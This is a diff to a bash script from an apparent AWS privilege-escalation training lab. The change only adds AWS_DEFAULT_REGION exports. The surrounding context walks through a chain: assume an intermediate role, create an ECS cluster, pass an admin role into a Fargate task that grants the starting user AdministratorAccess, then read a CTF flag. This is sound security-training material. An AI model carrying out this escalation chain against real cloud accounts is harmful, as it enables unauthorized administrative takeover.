@@ -131,6 +131,7 @@ use_role_creds() {
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -149,6 +150,7 @@ echo -e "${GREEN}[OK] Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -158,6 +160,7 @@ echo -e "${GREEN}[OK] Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -171,6 +174,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Verifying starting user has limited permissions${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to create ECS cluster directly (should fail)..."
 if aws ecs create-cluster --region $AWS_REGION --cluster-name "test-fail-cluster" &> /dev/null; then
     # Clean up if it unexpectedly worked
@@ -186,6 +190,7 @@ echo -e "${YELLOW}Step 6: HOP 1 - Assuming the intermediate role with ECS permis
 echo -e "${BLUE}Attack Vector: sts:AssumeRole${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 INTERMEDIATE_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${INTERMEDIATE_ROLE}"
 echo "Target Role: $INTERMEDIATE_ROLE_ARN"
 echo ""
@@ -210,6 +215,7 @@ ROLE_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 # Activate role credentials
 use_role_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Verify we assumed the role
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
@@ -226,6 +232,7 @@ echo ""
 echo -e "${YELLOW}Step 7: Verifying intermediate role permissions${NC}"
 use_role_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "The intermediate role should have ECS and PassRole permissions..."
 echo "Still cannot list IAM users (not admin yet)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
@@ -241,6 +248,7 @@ echo -e "${YELLOW}Step 8: HOP 2 - Creating ECS cluster${NC}"
 echo -e "${BLUE}Attack Vector: ecs:CreateCluster${NC}"
 use_role_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Cluster name: $CLUSTER_NAME"
 echo ""
 
@@ -264,6 +272,7 @@ echo ""
 echo -e "${YELLOW}Step 9: Getting network configuration for Fargate tasks${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Fargate requires network configuration (VPC and subnet)..."
 
 # Get default VPC
@@ -302,6 +311,7 @@ echo -e "${YELLOW}Step 10: Registering ECS task definition with admin role${NC}"
 echo -e "${BLUE}Attack Vector: iam:PassRole + ecs:RegisterTaskDefinition${NC}"
 use_role_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the privilege escalation vector - passing the admin role to ECS task..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
@@ -366,6 +376,7 @@ echo -e "${YELLOW}Step 11: Running ECS task on Fargate${NC}"
 echo -e "${BLUE}Attack Vector: ecs:RunTask${NC}"
 use_role_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This task will use the admin role to grant admin access to our starting user..."
 
 show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster "$CLUSTER_NAME" --task-definition "$TASK_FAMILY" --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" --output json"
@@ -391,6 +402,7 @@ echo ""
 echo -e "${YELLOW}Step 12: Waiting for ECS task to complete${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Monitoring task status (this may take 1-2 minutes)..."
 echo ""
 
@@ -461,6 +473,7 @@ echo -e "${GREEN}[OK] IAM policy propagated${NC}\n"
 echo -e "${YELLOW}Step 14: Switching back to starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Verify identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
@@ -472,6 +485,7 @@ echo -e "${GREEN}[OK] Switched to starting user credentials${NC}\n"
 echo -e "${YELLOW}Step 15: Verifying administrator access${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users..."
 echo "(The ECS task should have attached AdministratorAccess to starting user)"
 echo ""
@@ -494,6 +508,7 @@ echo ""
 # implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo -e "${YELLOW}Step 16: Capturing CTF flag from SSM Parameter Store${NC}"
 FLAG_PARAM_NAME="/pathfinding-labs/flags/sts-001-to-ecs-002-to-admin-to-admin"
 show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
